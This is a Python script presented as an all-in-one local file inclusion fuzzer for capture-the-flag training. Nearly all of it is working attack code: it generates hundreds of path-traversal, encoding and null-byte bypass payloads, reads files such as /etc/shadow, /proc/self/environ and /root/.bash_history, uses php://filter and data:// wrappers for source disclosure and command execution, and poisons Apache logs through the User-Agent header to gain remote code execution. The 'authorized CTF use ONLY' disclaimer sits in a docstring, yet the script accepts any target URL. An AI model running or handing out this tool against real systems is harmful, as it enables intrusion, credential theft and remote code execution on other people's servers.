#!/usr/bin/env python3

import requests
import argparse
import urllib.parse
import base64
from termcolor import colored
import sys

# --- SCRIPT CONFIGURATION ---
SUCCESS_INDICATORS = ['root:x:0:0', 'www-data', 'boot.ini', 'Users', 'DOCUMENT_ROOT', 'apache']
RCE_COMMAND = "id" # The command to execute for RCE checks

class LFIFuzzer:
    """
    An automated LFI fuzzer and exploiter based on a comprehensive set of techniques.
    Accepts a URL with a 'pwnsec' keyword to mark the injection point.
    For educational and authorized CTF use ONLY.
    """
    def __init__(self, fuzz_url, wordlist_path=None):
        if "pwnsec" not in fuzz_url:
            self._print_status("URL must contain the 'pwnsec' keyword to specify the injection point.", "fail")
            sys.exit(1)
            
        self.fuzz_url = fuzz_url
        self.wordlist_path = wordlist_path
        self.base_url = fuzz_url.split('?')[0] # Used for log poisoning base request
        self.session = requests.Session()
        self.session.verify = False # Ignore SSL warnings in CTF environments
        requests.packages.urllib3.disable_warnings() # Suppress insecure request warnings
        self.is_vulnerable = False

    def _print_status(self, message, level="info"):
        if level == "info":
            print(colored(f"[*] {message}", "blue"))
        elif level == "success":
            print(colored(f"[+] {message}", "green", attrs=["bold"]))
        elif level == "fail":
            print(colored(f"[-] {message}", "red"))
        elif level == "warn":
            print(colored(f"[!] {message}", "yellow"))

    def _send_request(self, payload):
        """Centralized request sender that injects the payload string at the pwnsec keyword."""
        try:
            # URL-encode the payload to handle special characters correctly in the request
            encoded_payload = urllib.parse.quote(payload, safe='/:%')
            target_url = self.fuzz_url.replace("pwnsec", encoded_payload)
            response = self.session.get(target_url, timeout=10)
            return response
        except requests.RequestException as e:
            self._print_status(f"Request failed for payload: {payload} ({e})", "fail")
            return None

    def _check_success(self, response):
        """Checks for success indicators in the response."""
        if response and response.status_code == 200:
            for indicator in SUCCESS_INDICATORS:
                if indicator in response.text:
                    return True
        return False

    def _generate_discovery_payloads(self, base_file):
        """Generates a comprehensive list of discovery payloads based on various techniques."""
        payloads = set()
        
        # 1. Generate base traversal paths
        base_paths = {base_file}
        for i in range(1, 12):
            base_paths.add(f"{'../' * i}{base_file}")

        # 2. Apply complex traversal, filter bypasses, and path truncation
        transformed_paths = set()
        for path in base_paths:
            transformed_paths.add(path)
            if '../' in path:
                transformed_paths.add(path.replace('../', '....//'))
                transformed_paths.add(path.replace('../', '..///////'))
                transformed_paths.add(path.replace('../', '.././'))
                transformed_paths.add(path.replace('../', '..\\/')) # Mixed slashes
                transformed_paths.add(path.replace('../', '%c0%ae%c0%ae/')) # UTF-8 bypass
            transformed_paths.add(path + '/./././././.') # Path truncation with /./
            transformed_paths.add(path + '\\.\\.\\.\\.\\.') # Path truncation with \.\

        # 3. Apply various encodings and suffixes to all transformed paths
        final_payloads = set()
        for path in transformed_paths:
            # Raw
            final_payloads.add(path)
            final_payloads.add(path + '%00')
            
            # Single URL-encoded
            encoded_path = urllib.parse.quote(path)
            final_payloads.add(encoded_path)
            final_payloads.add(encoded_path + '%00')
            
            # Double URL-encoded
            double_encoded_path = urllib.parse.quote(encoded_path)
            final_payloads.add(double_encoded_path)
            # THIS IS THE SPECIFIC BYPASS YOU MENTIONED
            final_payloads.add(double_encoded_path + '%00') 

            # Path truncation with dots
            final_payloads.add(path + '............')

            # Null byte with image extensions
            for ext in ['.png', '.jpg', '.gif']:
                final_payloads.add(path + '%00' + ext)

        # 4. Add protocol wrappers separately
        final_payloads.add(f"file://{base_file}")
        final_payloads.add(f"file:///proc/1/root/{base_file.lstrip('/')}")

        return list(final_payloads)

    def run_basic_discovery(self):
        """
        Covers Basic LFI, Encodings, and Bypasses to confirm the vulnerability.
        Starts with absolute path and defaults to '/etc/passwd' for speed.
        """
        self._print_status("Phase 1: Running Comprehensive LFI Discovery...")
        base_file = "/etc/passwd"
        
        # Start with a high-priority absolute path test for a quick win
        self._print_status(f"Starting with high-priority absolute path test for '{base_file}'...")
        response = self._send_request(base_file)
        if self._check_success(response):
            display_payload = urllib.parse.quote(base_file, safe='/:%')
            full_url = self.fuzz_url.replace("pwnsec", display_payload)
            self._print_status(f"VULNERABLE! (Absolute Path) Full Payload URL: {full_url}", "success")
            self.is_vulnerable = True
            return True
        
        self._print_status("Absolute path test failed, proceeding with full fuzzing...", "warn")

        payloads = self._generate_discovery_payloads(base_file)
        self._print_status(f"Generated {len(payloads)} unique traversal and bypass payloads for discovery.")
        
        for i, payload in enumerate(payloads):
            progress_text = f"[*] Testing payload {i+1}/{len(payloads)}..."
            sys.stdout.write(f"\r{progress_text.ljust(80)}")
            sys.stdout.flush()
            
            # Send raw payload string, let the sender handle final URL encoding
            response = self._send_request(payload)
            if self._check_success(response):
                sys.stdout.write("\r" + " " * 80 + "\r")
                # Re-create the final URL for display without requests' encoding
                display_payload = urllib.parse.quote(payload, safe='/:%')
                full_url = self.fuzz_url.replace("pwnsec", display_payload)
                self._print_status(f"VULNERABLE! Full Payload URL: {full_url}", "success")
                self.is_vulnerable = True
                return True
        
        sys.stdout.write("\r" + " " * 80 + "\r")
        self._print_status("Basic discovery failed. Target may not be vulnerable.", "fail")
        return False

    def read_sensitive_files(self):
        """
        Phase 2: If vulnerable, attempt to read a wide range of sensitive files.
        """
        self._print_status("\nPhase 2: Attempting to Read Sensitive Files...")
        # Start with a default list of high-value files
        files_to_read = [
            "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/group",
            "/proc/self/environ", "/proc/self/cmdline",
            "/var/log/apache2/access.log", "/var/log/nginx/access.log", "/var/log/auth.log",
            "/var/www/html/index.php", "/var/www/html/.htaccess", "/root/.bash_history"
        ]
        
        # Add files from the user-provided wordlist if it exists
        if self.wordlist_path:
            self._print_status(f"Loading additional files from wordlist: {self.wordlist_path}", "info")
            try:
                with open(self.wordlist_path, 'r') as f:
                    custom_files = [line.strip() for line in f if line.strip()]
                    files_to_read.extend(custom_files)
                    self._print_status(f"Added {len(custom_files)} files from wordlist.", "info")
            except FileNotFoundError:
                self._print_status(f"Wordlist file not found at: {self.wordlist_path}", "fail")

        traversal = "../../../../../../"
        for file in set(files_to_read): # Use set to avoid duplicates
            payload = f"{traversal}{file}"
            self._print_status(f"Attempting to read: {file}")
            response = self._send_request(payload)
            if response and len(response.text) > 20 and "<html" not in response.text.lower():
                display_payload = urllib.parse.quote(payload, safe='/:%')
                full_url = self.fuzz_url.replace("pwnsec", display_payload)
                self._print_status(f"Successfully read file with URL: {full_url}", "success")
                print(colored("--- File Content (first 250 chars) ---", "cyan"))
                print(response.text[:250])
                print(colored("------------------------------------", "cyan"))

    def test_php_wrappers(self):
        """
        Phase 3: Test PHP wrappers for source code disclosure and RCE.
        """
        self._print_status("\nPhase 3: Testing PHP Wrappers...")
        target_file = self.base_url.split('/')[-1] or "index.php"
        
        self._print_status(f"Testing php://filter to read '{target_file}'...")
        payload = f"php://filter/convert.base64-encode/resource={target_file}"
        response = self._send_request(payload)
        
        if response and response.text:
            try:
                decoded_source = base64.b64decode(response.text).decode('utf-8', errors='ignore')
                if "<?php" in decoded_source or "function" in decoded_source:
                    display_payload = urllib.parse.quote(payload, safe='/:%')
                    full_url = self.fuzz_url.replace("pwnsec", display_payload)
                    self._print_status(f"Successfully read source via php://filter! URL: {full_url}", "success")
            except Exception: pass
        
        self._print_status(f"Testing data:// wrapper for RCE with command: '{RCE_COMMAND}'")
        php_code = f"<?php system('{RCE_COMMAND}'); ?>"
        b64_code = base64.b64encode(php_code.encode()).decode()
        payload = f"data://text/plain;base64,{b64_code}"
        response = self._send_request(payload)
        if response and response.text and len(response.text) < 100:
             display_payload = urllib.parse.quote(payload, safe='/:%')
             full_url = self.fuzz_url.replace("pwnsec", display_payload)
             self._print_status(f"data:// wrapper executed. Full URL: {full_url}", "success")
             print(colored(f"Output: {response.text}", "green"))
             
    def attempt_log_poisoning(self):
        """
        Phase 4: Attempt RCE via log poisoning.
        """
        self._print_status("\nPhase 4: Attempting RCE via Log Poisoning...")
        log_file = "/var/log/apache2/access.log"
        traversal = "../../../../../../"
        
        self._print_status(f"Step 1: Injecting PHP payload into User-Agent...")
        php_payload = f"<?php echo 'POISON_SUCCESS_START'; system('{RCE_COMMAND}'); echo 'POISON_SUCCESS_END'; ?>"
        headers = {'User-Agent': php_payload}
        
        try:
            self.session.get(self.base_url, headers=headers, timeout=5)
            self._print_status("Poison request sent.", "info")
        except requests.RequestException:
            self._print_status("Poison request sent (connection error ignored).", "warn")
            
        self._print_status(f"Step 2: Including log file '{log_file}' to trigger RCE...")
        log_payload = f"{traversal}{log_file}"
        response = self._send_request(log_payload)
        
        if response and 'POISON_SUCCESS_START' in response.text:
            display_payload = urllib.parse.quote(log_payload, safe='/:%')
            full_url = self.fuzz_url.replace("pwnsec", display_payload)
            self._print_status(f"LOG POISONING SUCCESSFUL! Trigger URL: {full_url}", "success")
            start = response.text.find('POISON_SUCCESS_START') + len('POISON_SUCCESS_START')
            end = response.text.find('POISON_SUCCESS_END')
            command_output = response.text[start:end].strip()
            
            print(colored(f"--- Command Output from Log Poisoning ---", "cyan"))
            print(colored(command_output, "green"))
            print(colored("-----------------------------------------", "cyan"))
        else:
            self._print_status("Log poisoning attempt failed or output not found.", "fail")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="A comprehensive LFI fuzzer for CTF training. Uses 'pwnsec' as a payload placeholder.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("--url", required=True, help="Full URL of the target, with 'pwnsec' marking the injection point.\nExample: 'http://target.com/page.php?file=pwnsec'")
    parser.add_argument("--attack", action="store_true", help="Launch full attack chain (file reading, wrappers, RCE) if vulnerability is found.")
    parser.add_argument("--wordlist", help="Optional path to a wordlist of additional files to test for.")
    
    args = parser.parse_args()

    print(colored("="*60, "magenta"))
    print(colored("      All-in-One LFI Fuzzing Tool for CTF      ", "magenta", attrs=["bold"]))
    print(colored("="*60, "magenta"))
    print(f"Target URL: {args.url}")
    
    fuzzer = LFIFuzzer(args.url, args.wordlist)
    
    if fuzzer.run_basic_discovery():
        if args.attack:
            fuzzer.read_sensitive_files()
            fuzzer.test_php_wrappers()
            fuzzer.attempt_log_poisoning()
    
    print("\nFuzzing complete.")

